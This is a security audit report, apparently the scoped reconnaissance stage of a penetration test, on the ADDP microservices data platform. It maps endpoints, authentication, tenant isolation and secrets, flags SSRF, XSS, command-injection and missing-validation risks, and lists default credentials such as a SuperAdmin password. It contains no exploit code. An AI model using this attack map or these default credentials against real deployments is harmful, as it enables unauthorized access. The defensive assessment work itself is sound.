# Code Analysis Report: ADDP (All Domain Data Platform)

**Analysis Date:** 2026-02-13
**Platform Version:** 0.0.25
**Primary Languages:** Go, Python, JavaScript/Vue.js
**Architecture:** Microservices with Modular Monolith Components

---

# Penetration Test Scope & Boundaries

**Primary Directive:** This analysis is strictly limited to the **network-accessible attack surface** of the application. All subsequent tasks must adhere to this scope. Before reporting any finding (e.g., an entry point, a vulnerability sink), it must first meet the "In-Scope" criteria.

### In-Scope: Network-Reachable Components
A component is considered **in-scope** if its execution can be initiated, directly or indirectly, by a network request that the deployed application server is capable of receiving. This includes:
- Publicly exposed web pages and API endpoints
- Endpoints requiring authentication via the application's standard login mechanisms
- Any developer utility, debug console, or script that has been mistakenly exposed through a route or is otherwise callable from other in-scope, network-reachable code

### Out-of-Scope: Locally Executable Only
A component is **out-of-scope** if it **cannot** be invoked through the running application's network interface and requires an execution context completely external to the application's request-response cycle. This includes tools that must be run via:
- A command-line interface (e.g., `go run ./cmd/...`, `python scripts/...`)
- A development environment's internal tooling (e.g., a "run script" button in an IDE)
- CI/CD pipeline scripts or build tools (e.g., Dagger build definitions)
- Database migration scripts, backup tools, or maintenance utilities
- Local development servers, test harnesses, or debugging utilities
- Static files or scripts that require manual opening in a browser (not served by the application)

---

## 1. Executive Summary

The All Domain Data Platform (ADDP) is a sophisticated enterprise-level microservices-based geospatial data management system with a **medium-high security risk profile**. The platform demonstrates strong architectural foundations with proper JWT validation, multi-tenancy isolation, and robust encryption practices. However, several critical vulnerabilities require immediate attention before production deployment.

**Critical Findings:**
- **SSRF vulnerabilities** in the service proxy endpoint allowing attackers to target internal infrastructure
- **XSS vulnerabilities** in map popup rendering and search result display
- **Command injection risks** in the ABS lab service allowing remote code execution
- **Default credentials** present in configuration examples that must be changed
- **Database connections** configured without TLS encryption, exposing credentials in transit

**Security Strengths:**
- Strong JWT implementation with algorithm confusion attack prevention (CVE-2015-9235 mitigation)
- AES-256-GCM encryption for sensitive data at rest
- Multi-tenant data isolation with schema-based separation
- Comprehensive role-based access control (RBAC)
- API key security with SHA-256 hashing and rate limiting

**Overall Assessment:** The platform requires immediate security hardening before production deployment, particularly around SSRF prevention, XSS mitigation, and TLS enablement. With these fixes, the platform demonstrates enterprise-grade security architecture suitable for sensitive data processing.

---

## 2. Architecture & Technology Stack

### Framework & Language

The ADDP platform implements a **microservices architecture** with nine core backend services, three background worker services, four Python-based workflow engines, and a unified Vue.js frontend portal. This hybrid architecture combines the scalability benefits of microservices with the operational simplicity of shared infrastructure components.

**Backend Services (Go 1.24+):**
- **Gin Framework (v1.11.0):** High-performance HTTP web framework powering all Go services
- **GORM (v1.30.0):** Database ORM with support for PostgreSQL, MySQL, ClickHouse, and MongoDB
- **Asynq (v0.24.1):** Redis-backed distributed task queue for background processing
- **golang-jwt/jwt/v5:** JWT authentication with strict algorithm verification

**Workflow Engines (Python 3.11+):**
- **Flask 3.0.0:** Web framework for workflow engine APIs
- **GeoPandas 0.15.0+:** Spatial data processing library
- **NumPy 2.0+ / Pandas 2.0+:** Data manipulation and analysis

**Frontend (Vue 3.4+):**
- **Vue 3 Composition API** with TypeScript 5.3
- **Vite 5.0:** Modern build tool with fast HMR
- **Element Plus (v2.11.4):** Enterprise UI component library
- **Pinia 2.1.7:** Official state management

**Security Implications:**
- Modern framework versions reduce exposure to known CVEs
- Go's type safety prevents many memory corruption vulnerabilities
- Python's simpleeval library provides sandboxed expression evaluation
- Vue 3's automatic HTML escaping mitigates many XSS risks (but not v-html usage)

### Architectural Pattern

The platform implements a **microservices architecture with unified API gateway** and schema-based multi-tenancy. Nine independent services (System, Manager, Meta, Transfer, Orchestrator, Develop, Service, Copilot, Gateway) communicate via REST APIs and share a single PostgreSQL database with schema isolation.

**Trust Boundaries:**
1. **External → Gateway:** Nginx reverse proxy with API key authentication
2. **Gateway → Backend Services:** Internal API key authentication (X-Internal-API-Key)
3. **Services → Database:** Tenant isolation enforced at application layer
4. **Services → External APIs:** LLM providers, storage services, search engines

**Privilege Escalation Paths:**
- **SuperAdmin Role:** Bypasses tenant isolation, full platform access
- **Internal API Key Compromise:** Allows impersonation of any tenant
- **Database Access:** Direct database access bypasses all application-layer security
- **Redis Access:** Token cache manipulation could enable session hijacking

**Data Flow Security Concerns:**
- User credentials flow from frontend → System service → PostgreSQL (JWT issued)
- Database credentials stored encrypted in `system.engines` table (AES-256-GCM)
- External service credentials stored encrypted (LLM API keys, S3 credentials)
- File uploads bypass application servers and go directly to MinIO (presigned URLs)
- Search queries flow through Meilisearch with cached results (potential data leakage)

### Critical Security Components

**Authentication & Authorization:**
- **JWT-based authentication** with HS256 algorithm and 180-minute expiration
- **API key authentication** for programmatic access (SHA-256 hashed storage)
- **Internal service authentication** via X-Internal-API-Key header
- **Multi-factor authentication:** NOT IMPLEMENTED (critical gap)

**Session Management:**
- **Stateless JWT tokens** stored in browser localStorage (XSS vulnerable)
- **Token refresh mechanism** allows renewal with expired tokens
- **Redis-based token caching** reduces System service load by 90%
- **No server-side revocation** mechanism (compromised tokens valid until expiration)

**Encryption:**
- **Data at rest:** AES-256-GCM for database credentials, API keys, secrets
- **Data in transit:** TLS termination at Nginx (internal services use HTTP)
- **Password storage:** bcrypt with cost factor 10
- **Key management:** Single encryption key stored in environment variable (no rotation)

**Input Validation:**
- **Framework-level validation** via Gin binding tags (required, min, max)
- **SQL injection protection** via GORM parameterized queries
- **XSS protection:** Vue.js auto-escaping (bypassed by v-html usage)
- **Command injection:** Minimal validation in ABS lab service (CRITICAL VULNERABILITY)

---

## 3. Authentication & Authorization Deep Dive

### Authentication Mechanisms and Security Properties

The ADDP platform implements a **JWT-based stateless authentication system** with proper security controls and algorithm verification. The authentication flow centers on the System service, which acts as the identity provider for all other modules.

**JWT Token Structure:**
The platform uses HMAC-SHA256 (HS256) signed tokens with the following claims:
- `user_id` (uint): Database primary key
- `username` (string): User identifier
- `tenant_id` (uint): Multi-tenancy isolation key
- `exp` (timestamp): Token expiration (default 180 minutes)
- `iat` (timestamp): Issued at timestamp

**Security Properties:**
- ✅ **Algorithm Confusion Prevention:** The JWT parser explicitly validates that tokens use HS256 algorithm, preventing CVE-2015-9235 attacks where attackers could downgrade to the "none" algorithm
- ✅ **Signature Verification:** All tokens are validated for signature integrity before processing
- ✅ **Expiration Enforcement:** Expired tokens are rejected (except in refresh flow)
- ⚠️ **No Token Revocation:** Compromised tokens remain valid until natural expiration
- ⚠️ **localStorage Storage:** Frontend stores tokens in localStorage (vulnerable to XSS)

**Implementation Details:**
- **Token Generation:** `/Users/pampa/code/addp/system/backend/pkg/utils/jwt.go` lines 17-32
- **Token Validation:** `/Users/pampa/code/addp/system/backend/pkg/utils/jwt.go` lines 34-63
- **Middleware:** `/Users/pampa/code/addp/common/middleware/auth/cached_middleware.go` lines 39-180

### Authentication API Endpoints

**All API endpoints used for authentication:**

1. **POST /api/system/login** - Primary authentication endpoint
   - **Location:** `/Users/pampa/code/addp/system/backend/internal/api/auth_handler.go` line 25
   - **Rate Limiting:** 5 attempts per 15 minutes per IP address
   - **Input:** `{"username": string, "password": string}`
   - **Output:** `{"access_token": string, "user": {...}}`
   - **Security:** Generic error messages prevent user enumeration

2. **POST /api/system/register** - User registration endpoint
   - **Location:** `/Users/pampa/code/addp/system/backend/internal/api/auth_handler.go` line 63
   - **Control:** Can be disabled via `ALLOW_PUBLIC_REGISTRATION=false`
   - **Validation:** Minimum 6-character password requirement
   - **Default:** Public registration disabled in production

3. **POST /api/system/refresh** - Token refresh endpoint
   - **Location:** `/Users/pampa/code/addp/system/backend/internal/api/auth_handler.go` line 88
   - **Mechanism:** Accepts expired tokens, issues new tokens with same claims
   - **Security:** Validates signature even for expired tokens
   - ⚠️ **No Rotation:** Same claims reused, no refresh token rotation

4. **GET /api/system/users/me** - Current user validation endpoint
   - **Location:** `/Users/pampa/code/addp/system/backend/internal/api/user_handler.go` line 23
   - **Purpose:** Token validation and user info retrieval
   - **Used by:** All services for JWT verification

5. **PUT /api/system/users/:id/change-password** - Password change endpoint
   - **Location:** `/Users/pampa/code/addp/system/backend/internal/api/user_handler.go` line 141
   - **Validation:** Requires old password verification
   - **Security:** Users can only change their own passwords (unless admin)

**Password Reset:** NOT IMPLEMENTED - No forgot password or email-based reset flow exists.

### Session Management and Token Security

**Session Cookie Configuration:**
The platform uses **stateless JWT tokens** instead of traditional server-side sessions. Tokens are transmitted via:
- `Authorization: Bearer <token>` header (preferred)
- `?token=<token>` query parameter (fallback, security risk)

**Critical Finding - Cookie Flags NOT CONFIGURED:**
The platform does NOT use cookies for JWT storage. Instead, tokens are stored in browser localStorage. This means traditional cookie security flags (HttpOnly, Secure, SameSite) are not applicable, but the system is **vulnerable to XSS-based token theft**.

**Frontend Token Storage:**
- **Location:** `/Users/pampa/code/addp/common-frontend/basic/src/composables/useAuth.js` lines 222-228
- **Storage Mechanism:** `localStorage.setItem('token', token)`
- **Security Impact:** Any XSS vulnerability can steal authentication tokens
- **Recommendation:** Migrate to HttpOnly cookies with SameSite=Strict

**Token Lifecycle:**
1. **Creation:** User logs in → System service generates JWT → Returned to client
2. **Storage:** Client stores in localStorage (security risk)
3. **Transmission:** Sent with every API request in Authorization header
4. **Validation:** Cached in Redis for 5 minutes, fallback to System service
5. **Renewal:** Refresh endpoint issues new token with same claims
6. **Termination:** Client deletes token (no server-side invalidation)

**Session Expiration:**
- **Default TTL:** 180 minutes (3 hours)
- **Configurable:** `JWT_EXPIRE_MINUTES` environment variable
- **Refresh Window:** Tokens can be refreshed even after expiration
- **Auto-Renewal:** Frontend automatically refreshes on 401 errors

### Authorization Model and Potential Bypass Scenarios

The platform implements a **hierarchical role-based access control (RBAC)** model with three user types:

**Role Hierarchy:**
1. **SuperAdmin** (`super_admin`)
   - Platform-wide access, manages tenants
   - Can access resources across all tenants
   - Default account: username "SuperAdmin", password "20251001#SuperAdmin" (SECURITY RISK)

2. **TenantAdmin** (`tenant_admin`)
   - Tenant-scoped admin, manages tenant users
   - Can create/update/delete users within tenant
   - Cannot access other tenants' resources

3. **Normal User** (`user`)
   - Basic access, own resources only
   - Tenant-restricted access
   - Cannot manage other users

**Authorization Implementation:**
- **Location:** `/Users/pampa/code/addp/common/service/auth_service.go` lines 14-151
- **Tenant Isolation:** Enforced via `CheckTenantAccess()` function
- **Resource Ownership:** Verified via `CheckResourceOwnership()` function
- **Permission Checks:** Centralized in AuthService

**Potential Bypass Scenarios:**

1. **Internal API Key Bypass:**
   - **Location:** `/Users/pampa/code/addp/common/middleware/auth/cached_middleware.go` lines 47-73
   - **Vulnerability:** Internal API key allows impersonation of any tenant by setting `X-Tenant-ID` header
   - **Risk:** Compromised internal key grants full platform access
   - **Code Comment:** "TODO: 验证内部 API Key" (validation not implemented)

2. **SuperAdmin Privilege Escalation:**
   - **Scenario:** Any user promoted to SuperAdmin bypasses all tenant restrictions
   - **Attack Vector:** SQL injection or authorization bypass in user update endpoint
   - **Impact:** Full platform access including other tenants' data

3. **Tenant ID Injection:**
   - **Scenario:** Attacker manipulates tenant_id in JWT claims
   - **Mitigation:** JWT signature prevents tampering (secure)
   - **Residual Risk:** Signing key compromise would enable tenant impersonation

4. **Direct Database Access:**
   - **Scenario:** Database credentials compromised, direct SQL access
   - **Bypass:** All application-layer authorization bypassed
   - **Impact:** Full data access without audit logs

### Multi-tenancy Security Implementation

**Schema-Based Isolation:**
The platform uses a single PostgreSQL database with separate schemas for each module:
- `system` - User management, engines, applications
- `manager` - File metadata, embeddings
- `meta` - Metadata catalog
- `transfer` - Data transfer tasks
- `orchestrator` - Workflow orchestration
- `develop` - SQL workbench, notebooks
- `service` - Published data services
- `copilot` - AI assistant

**Row-Level Tenant Isolation:**
Every tenant-specific table includes a `tenant_id` foreign key. Authorization middleware injects the authenticated user's tenant_id into the request context, and all queries filter by this value:

```go
// Example from /Users/pampa/code/addp/common/service/auth_service.go lines 39-62
func CheckTenantAccess(user *models.User, resourceTenantID uint) error {
    if IsSuperAdmin(user) {
        return nil  // Super admins bypass tenant checks
    }
    if user.TenantID == nil || user.TenantID != resourceTenantID {
        return errors.New("没有权限访问该租户的资源")
    }
    return nil
}
```

**Tenant Isolation Effectiveness:**
- ✅ **Strong:** Middleware enforces tenant_id on all queries
- ✅ **Defense-in-Depth:** SuperAdmin access logged in audit trail
- ⚠️ **Missing:** No PostgreSQL Row-Level Security (RLS) policies as backup
- ⚠️ **Risk:** Application bug could leak cross-tenant data

### SSO/OAuth/OIDC Flows

**Status:** NOT IMPLEMENTED

The platform does NOT currently support:
- OAuth 2.0 authentication
- OpenID Connect (OIDC)
- SAML
- Social login (Google, GitHub, etc.)
- Enterprise SSO integration

**Implications:**
- Each user must have platform-specific credentials
- No centralized identity management
- No single sign-on experience
- Password management burden on users

**Recommendation:** Implement OIDC for enterprise deployments to support:
- Integration with existing identity providers (Okta, Auth0, Azure AD)
- Single sign-on experience
- Centralized access control
- Reduced password management overhead

**If SSO Were Implemented, Critical Validations Required:**
- `state` parameter validation to prevent CSRF attacks
- `nonce` parameter validation to prevent replay attacks
- Callback endpoint authentication to verify the identity provider
- Token signature verification using provider's public keys

---

## 4. Data Security & Storage

### Database Security

**Database Technology:** PostgreSQL 15+ with extensions:
- **PostGIS:** Spatial data support with geometry/geography types
- **pgvector:** Vector similarity search (1024 dimensions)
- **Multi-schema isolation:** Tenant separation via schema namespaces

**Encryption Analysis:**
The platform implements **field-level encryption** for sensitive database credentials stored in the `system.engines` table. Connection information (host, username, password, API keys) is stored as encrypted JSON using AES-256-GCM.

**Encryption Implementation:**
- **Location:** `/Users/pampa/code/addp/common/utils/encryption.go` lines 12-70
- **Algorithm:** AES-256-GCM (Galois/Counter Mode - authenticated encryption)
- **Key Size:** 32 bytes (256 bits) enforced
- **Nonce:** 12 bytes, cryptographically random per encryption
- **Key Source:** `ENCRYPTION_KEY` environment variable

**Database Connection Security - CRITICAL VULNERABILITY:**
All database connections use `sslmode=disable`, transmitting credentials in **clear text** over the network:
```go
// /Users/pampa/code/addp/common/models/engine.go line 147
dsn := fmt.Sprintf("host=%s port=%s user=%s password=%s dbname=%s sslmode=disable",
    host, port, user, password, dbname)
```

**Impact:** Database passwords are encrypted at rest but exposed in transit on untrusted networks.

**Access Controls:**
- **Database User:** Single application user with permissions to all schemas
- **Schema Isolation:** Each module uses a dedicated PostgreSQL schema
- **Row-Level Security:** NOT IMPLEMENTED - relies on application-layer filtering
- **Audit Logging:** Minimal database-level logging

**Query Safety:**
The platform uses GORM for database access, which provides automatic parameterization:
```go
// Example from /Users/pampa/code/addp/system/backend/internal/repository/user_repository.go
result := db.Where("username = ?", username).First(&user)
```
All queries use parameterized statements, preventing SQL injection attacks.

### Data Flow Security

**Sensitive Data Paths:**

1. **User Credentials Flow:**
   ```
   Browser → HTTPS → Nginx → HTTP → System Service → bcrypt hash → PostgreSQL (encrypted connection DISABLED)
   ```
   - Password hashed with bcrypt before storage
   - JWT issued after successful authentication
   - Token stored in browser localStorage (XSS vulnerable)

2. **Database Credentials Flow:**
   ```
   Admin UI → Engine Creation → AES-256-GCM encryption → PostgreSQL system.engines table
   ```
   - Credentials encrypted before insertion
   - Decrypted in-memory when building connection strings
   - Used to connect to external databases (PostgreSQL, MySQL, ClickHouse, MongoDB)

3. **API Keys Flow:**
   ```
   User → API Key Generation → SHA-256 hash → PostgreSQL system.api_keys table
   ```
   - Plain text key shown once during creation
   - Only SHA-256 hash stored
   - Validated via three-tier cache (local → Redis → database)

4. **File Upload Flow:**
   ```
   Browser → Presigned URL → MinIO (direct upload, bypasses application server)
   ```
   - Application generates presigned S3 URLs
   - Files uploaded directly to MinIO object storage
   - Metadata stored in manager.object_metadata table

5. **External API Credentials Flow:**
   ```
   Admin Config → AES-256-GCM encryption → Environment variables → LLM API calls
   ```
   - LLM API keys (DASHSCOPE_API_KEY, OPENAI_API_KEY, ANTHROPIC_API_KEY) stored in environment
   - Not encrypted in environment files (security risk)

**Protection Mechanisms:**
- ✅ Encryption at rest for database credentials
- ✅ bcrypt password hashing
- ✅ API key hashing before storage
- ⚠️ TLS disabled for database connections
- ⚠️ JWT tokens in localStorage (XSS vulnerable)
- ⚠️ LLM API keys in plain text environment files

### Multi-tenant Data Isolation

**Isolation Strategy:** The platform implements **schema-based multi-tenancy** with tenant_id foreign keys on all tenant-specific tables.

**Schema Separation:**
Each module has a dedicated PostgreSQL schema (system, manager, meta, transfer, etc.). Within each schema, tables include a `tenant_id` column for row-level isolation.

**Tenant Enforcement:**
- **Middleware:** Extracts tenant_id from JWT and injects into request context
- **Repository Layer:** Filters all queries by tenant_id
- **SuperAdmin Bypass:** SuperAdmins can access any tenant (logged in audit trail)

**Effectiveness Assessment:**
- ✅ **Strong application-layer isolation**
- ✅ **Consistent enforcement across all modules**
- ✅ **Audit logging for cross-tenant access**
- ⚠️ **No PostgreSQL Row-Level Security (RLS)** as defense-in-depth
- ⚠️ **Shared database user** - no database-level isolation

**Potential Bypass:**
- SQL injection could bypass tenant filtering (mitigated by GORM parameterization)
- Application bug could omit tenant_id filter (no RLS backup)
- Direct database access bypasses all isolation

**Recommendation:**
Implement PostgreSQL Row-Level Security policies:
```sql
CREATE POLICY tenant_isolation ON system.engines
    USING (tenant_id = current_setting('app.current_tenant_id')::int);
```

---

## 5. Attack Surface Analysis

### External Entry Points

The ADDP platform exposes a **comprehensive REST API surface** through a centralized API gateway with over 300 endpoints across 9 backend modules. All requests flow through Nginx on port 80, which routes to the Gateway service on port 8000.

**Public Endpoints (No Authentication Required):**

1. **Authentication Endpoints:**
   - `POST /api/system/login` - User authentication (rate limited: 5 attempts/15 minutes)
   - `POST /api/system/register` - User registration (can be disabled)
   - `POST /api/system/refresh` - Token refresh

2. **Health Check Endpoints:**
   - `GET /health` - Available on all services
   - `GET /` - Service information endpoints

3. **OGC Standards (Public Data Services):**
   - `GET /ogc/features/:serviceName` - OGC API Features landing page
   - `GET /ogc/features/:serviceName/collections` - Feature collections
   - `GET /ogc/features/:serviceName/collections/:collectionId/items` - Feature items
   - `GET /ogc/tiles/:serviceName/tiles/:layer/:z/:x/:y` - Vector tiles
   - `GET /wmts/:serviceName` - WMTS capabilities
   - `GET /tiles/:serviceName/:layerName/:z/:x/:y` - XYZ tiles

4. **Query Services (Authentication Checked Internally):**
   - `GET /api/query/:serviceName` - Query published data services

**Protected Endpoints (Authentication Required):**

**System Module (User & Engine Management):**
- `POST/GET/PUT/DELETE /api/system/users` - User CRUD operations
- `POST/GET/PUT/DELETE /api/system/engines` - Database engine management
- `POST /api/system/engines/:id/test` - Connection testing
- `POST/GET/PUT/DELETE /api/system/tenants` - Tenant management (admin only)
- `POST/GET/DELETE /api/system/applications/:id/keys` - API key management

**Manager Module (Data Management):**
- `GET /api/manager/engines/:id/spatial/tiles/:schema/:table/:z/:x/:y` - MVT tile generation
- `GET /api/manager/preview` - Data preview endpoint
- `POST /api/manager/embedding` - Vector embedding generation
- `GET /api/manager/search` - Hybrid search (full-text + vector similarity)
- `GET /api/manager/video-stream` - Video content streaming

**Service Module (Data Publishing):**
- `POST/GET/PUT/DELETE /api/service/tile` - Tile service management
- `POST/GET/PUT/DELETE /api/service/query` - Query service management
- `POST/GET/PUT/DELETE /api/service/registered` - External service registration
- `ANY /api/service/registered/proxy/:id/*path` - **CRITICAL: Service proxy (SSRF risk)**

**Transfer Module (Data Transfer):**
- `POST/GET/PUT/DELETE /api/transfer/tasks` - Transfer task management
- `POST /api/transfer/tasks/:id/start` - Execute transfer
- `POST /api/transfer/local-engines` - Local engine configuration

**Meta Module (Metadata Management):**
- `POST /api/meta/scan/engine` - Metadata scanning
- `GET /api/meta/metadata/tables` - Table metadata retrieval
- `GET /api/meta/engines/:engine_id/tree` - Metadata tree navigation

**Develop Module (SQL Workbench & Notebooks):**
- `POST /api/develop/execute` - SQL query execution
- `POST /api/develop/notebooks/execute` - Jupyter notebook execution
- `POST /api/develop/notebooks/upload` - **File upload endpoint**

**Orchestrator Module (Workflow Execution):**
- `POST/GET/PUT/DELETE /api/orchestrator/orchestrations` - Workflow management
- `POST /api/orchestrator/orchestrations/:id/execute` - Workflow execution

**Workflow Engines (Python/Flask):**
- `POST /api/workflow` - Execute workflow DAG (Port 8099)
- `POST /api/operators/<operator_name>/execute` - Execute single operator
- `GET /api/operators` - List available operators

**ABS Lab (Experimental AI Service):**
- `POST /api/tasks` - Create AI code generation task
- `POST /api/apps` - Create application
- `POST /api/apps/:id/launch` - **CRITICAL: Launch application (command injection risk)**
- `ANY /api/app-proxy/:app_id/*path` - Proxy to running apps
- `GET /ws` - **WebSocket endpoint** for real-time updates

**Input Validation Patterns:**
- **Framework-Level:** Gin binding with struct tags (`required`, `min`, `max`, `email`)
- **GORM Parameterization:** Prevents SQL injection
- **Custom Validation:** Limited, mostly type checking
- **File Upload Validation:** Extension-based, no magic number checks
- **URL Validation:** NOT IMPLEMENTED (SSRF vulnerability in service proxy)

### Internal Service Communication

**Service-to-Service Authentication:**
All internal communication uses the `X-Internal-API-Key` header for authentication:
```go
// /Users/pampa/code/addp/common/middleware/auth/cached_middleware.go lines 47-73
internalKey := c.GetHeader("X-Internal-API-Key")
if internalKey != "" {
    // TODO: 验证内部 API Key
    // Set internal service context
}
```

**CRITICAL FINDING:** The TODO comment indicates internal API key validation is **NOT IMPLEMENTED**. Any service with knowledge of the key can impersonate other services and inject arbitrary tenant IDs.

**Service Communication Patterns:**

1. **Gateway → Backend Services:**
   - Authentication: API Key (for external requests) or Internal API Key
   - Protocol: HTTP (no TLS)
   - Network: Docker bridge network (addp-network)

2. **Backend Services → System Service:**
   - Purpose: User validation, engine retrieval, audit logging
   - Authentication: Internal API Key
   - Endpoints: `/api/internal/*`

3. **Orchestrator → Workflow Engines:**
   - Purpose: Execute workflows
   - Authentication: None (trust-based)
   - Protocol: HTTP
   - **Security Risk:** Workflow engines trust orchestrator without validation

4. **All Services → PostgreSQL:**
   - Protocol: PostgreSQL wire protocol (no TLS)
   - Credentials: Shared database user
   - Network: Docker bridge network

5. **All Services → Redis:**
   - Purpose: Caching, task queue, rate limiting
   - Authentication: Password-based (REDIS_PASSWORD)
   - Protocol: Redis protocol (no TLS)

**Trust Relationships:**
- **High Trust:** Backend services trust Gateway authentication
- **Implicit Trust:** Workflow engines trust orchestrator requests
- **Database Trust:** All services share database credentials
- **Redis Trust:** All services share Redis credentials

**Security Assumptions:**
- ✅ Docker network isolation prevents external access to internal services
- ⚠️ Compromised container can access all internal services
- ⚠️ No mutual TLS for service verification
- ⚠️ Shared credentials increase blast radius of compromise

### Background Processing

**Asynq Worker Architecture:**
The platform uses Redis-backed distributed task queues (Asynq) for background processing:

**Worker Services:**
1. **Manager Worker** - 10 concurrent tasks
   - Embedding generation (multimodal with Qwen 2.5-VL)
   - Quick view pre-caching
   - Metadata indexing

2. **Meta Worker** - 10 concurrent tasks
   - Metadata scanning
   - Schema discovery
   - Catalog synchronization

3. **Transfer Worker** - 15 concurrent tasks
   - Data import/export
   - Database synchronization
   - File transfers

**Privilege Model:**
- Workers run with **same privileges** as backend services
- Share database credentials and encryption keys
- Can access all tenant data (tenant_id passed in job payload)
- No additional authorization checks on background jobs

**Security Implications:**

1. **Task Injection:**
   - Attacker with Redis access can inject malicious tasks
   - Task payloads not signed or encrypted
   - Could trigger unauthorized operations

2. **Resource Exhaustion:**
   - No rate limiting on task submission
   - Could overwhelm workers with high-volume tasks
   - Memory limits per worker: 2GB (Docker deployment)

3. **Job Payload Tampering:**
   - Redis stores job data in plain text
   - Attacker with Redis access can modify pending jobs
   - Could change tenant_id to access other tenants' data

**Async Job Security Controls:**
- ✅ Tenant ID validation on job execution
- ✅ Resource limits (CPU, memory) per worker
- ⚠️ No job signing or integrity verification
- ⚠️ No audit logging for background jobs
- ❌ No job prioritization or throttling per tenant

**Recommendation:**
- Implement HMAC signatures for job payloads
- Add audit logging for all background operations
- Implement per-tenant job rate limiting
- Use separate Redis instances for different security zones

---

## 6. Infrastructure & Operational Security

### Secrets Management

**Storage Mechanism:**
All secrets are stored in **environment variables** loaded from `.env` files. The platform does NOT use a dedicated secret management service (Vault, AWS Secrets Manager, etc.).

**Critical Secrets:**

1. **JWT_SECRET** (Lines 35-49 in .env.example)
   - **Purpose:** JWT token signing
   - **Validation:** Must be ≥32 characters, enforced at startup
   - **Default:** "your-super-secret-jwt-key-change-this-in-production"
   - **Location:** `/Users/pampa/code/addp/system/backend/internal/config/config.go` lines 66-91

2. **ENCRYPTION_KEY** (Lines 85-95 in .env.example)
   - **Purpose:** AES-256 encryption for database credentials
   - **Format:** Base64-encoded 32-byte key
   - **Default:** "your-encryption-key-change-this-in-production"
   - **Rotation:** NOT SUPPORTED - changing key breaks existing encrypted data

3. **INTERNAL_API_KEY** (Line 45 in .env.example)
   - **Purpose:** Service-to-service authentication
   - **Default:** "dev-internal-key"
   - **Validation:** NOT IMPLEMENTED (TODO in code)

4. **Database Credentials:**
   - `POSTGRES_PASSWORD`: Default "addp_password"
   - `REDIS_PASSWORD`: Default "addp_redis"
   - `MINIO_ROOT_USER/PASSWORD`: Default "minioadmin/minioadmin"

5. **LLM API Keys:**
   - `DASHSCOPE_API_KEY`: Alibaba Cloud AI
   - `OPENAI_API_KEY`: OpenAI GPT
   - `ANTHROPIC_API_KEY`: Claude
   - **Storage:** Plain text in environment variables

**Secret Rotation:**
- ✅ API keys can be revoked and regenerated via UI
- ❌ Encryption key rotation not supported
- ❌ JWT secret rotation not supported
- ❌ Database credential rotation requires manual process

**Security Assessment:**
- ⚠️ All secrets in plain text environment files
- ⚠️ Example file includes weak defaults with warnings
- ✅ `.env` files excluded from version control
- ❌ No integration with secret management services
- ❌ No automatic rotation capabilities

### Configuration Security

**Environment Separation:**
The platform provides separate configuration templates:
- `.env.example` - Development with documentation
- `.env.prod.example` - Production template
- `.env` - Actual configuration (gitignored)

**Configuration Validation:**

**JWT Secret Validation:**
```go
// /Users/pampa/code/addp/system/backend/internal/config/config.go lines 66-91
if len(cfg.JWTSecret) < 32 {
    log.Fatalf("JWT_SECRET must be at least 32 characters")
}
if strings.Contains(cfg.JWTSecret, "change-this-in-production") {
    log.Fatalf("JWT_SECRET contains default value - change it in production")
}
```

**Encryption Key Validation:**
```go
// /Users/pampa/code/addp/system/backend/internal/config/config.go lines 197-218
key, err := base64.StdEncoding.DecodeString(encKeyBase64)
if len(key) != 32 {
    log.Fatalf("ENCRYPTION_KEY must decode to exactly 32 bytes")
}
```

**Security Headers Configuration:**
**CRITICAL FINDING:** No security headers configured in Nginx or application code:
- ❌ `Strict-Transport-Security` (HSTS)
- ❌ `X-Frame-Options` (clickjacking protection)
- ❌ `X-Content-Type-Options` (MIME sniffing)
- ❌ `Content-Security-Policy` (XSS protection)
- ❌ `X-XSS-Protection` (legacy browser XSS filter)

**Expected Configuration Location:**
Security headers should be configured in:
- `/Users/pampa/code/addp/nginx/default.conf` (Nginx configuration)
- Kubernetes Ingress annotations (if using K8s)
- CDN settings (if using Cloudflare, etc.)

**No infrastructure configuration files were found** in the repository that define these headers.

**Cache-Control Headers:**
Standard caching headers are likely configured in Nginx but not visible in the analyzed backend code.

### External Dependencies

**Third-Party Services:**

1. **Meilisearch (Full-Text Search)**
   - **Version:** v1.7
   - **Authentication:** Master key (MEILISEARCH_MASTER_KEY)
   - **Network:** Internal (Docker network)
   - **Security:** Password-based authentication, no TLS

2. **MinIO (Object Storage)**
   - **Compatibility:** S3-compatible API
   - **Authentication:** Access key + secret key
   - **Buckets:** System (addp-data), Business (separate instance)
   - **Security:** Credentials encrypted before storage

3. **LLM Providers (AI Services):**
   - **DashScope (Alibaba):** Qwen 2.5-VL for embeddings
   - **OpenAI:** GPT models for copilot
   - **Anthropic:** Claude models for copilot
   - **Security:** API keys in environment variables (plain text)

4. **PostgreSQL Extensions:**
   - **PostGIS:** Spatial data functions
   - **pgvector:** Vector similarity search
   - **Security:** Trusted extensions, no external network access

**Dependency Security:**
- ✅ Modern framework versions (Go 1.24, Python 3.11, Vue 3)
- ✅ No known critical CVEs in core dependencies
- ⚠️ No automated dependency scanning configured
- ⚠️ LLM API keys stored in plain text
- ⚠️ External API calls lack certificate pinning

### Monitoring & Logging

**Audit Logging:**
The platform implements structured audit logging for security-relevant events:
- User authentication (login/logout)
- Resource creation/modification/deletion
- Permission changes
- Failed authentication attempts

**Audit Log Model:**
```go
// /Users/pampa/code/addp/system/backend/internal/models/audit_log.go
type AuditLog struct {
    ID         uint      `gorm:"primaryKey"`
    UserID     *uint     `gorm:"index"`
    TenantID   *uint     `gorm:"index"`
    Action     string    `gorm:"type:varchar(100)"`
    Resource   string    `gorm:"type:varchar(100)"`
    Details    string    `gorm:"type:text"`
    IPAddress  string    `gorm:"type:varchar(50)"`
    CreatedAt  time.Time `gorm:"autoCreateTime"`
}
```

**Log Retention:**
- **Default:** 30 days (configurable via `LOG_RETENTION_DAYS`)
- **Cleanup:** Automatic cron job deletes old logs
- **Storage:** PostgreSQL database (system.audit_logs table)

**Sensitive Data Masking:**
- ✅ Password hashes excluded from JSON serialization (json:"-" tag)
- ✅ API keys masked in logs
- ⚠️ Request/response bodies not logged by default

**Security Event Visibility:**
- ✅ Failed login attempts logged
- ✅ Permission denials logged
- ⚠️ No real-time alerting configured
- ⚠️ No SIEM integration
- ❌ Background job operations not logged

**Monitoring Endpoints:**
- `GET /health` - Basic health check on all services
- No Prometheus metrics exposed
- No distributed tracing configured

**Recommendation:**
- Implement centralized logging (ELK, Loki, or CloudWatch)
- Add Prometheus metrics for security monitoring
- Implement real-time alerting for security events
- Add distributed tracing for request correlation
- Implement log integrity protection (append-only, signed logs)

---

## 7. Overall Codebase Indexing

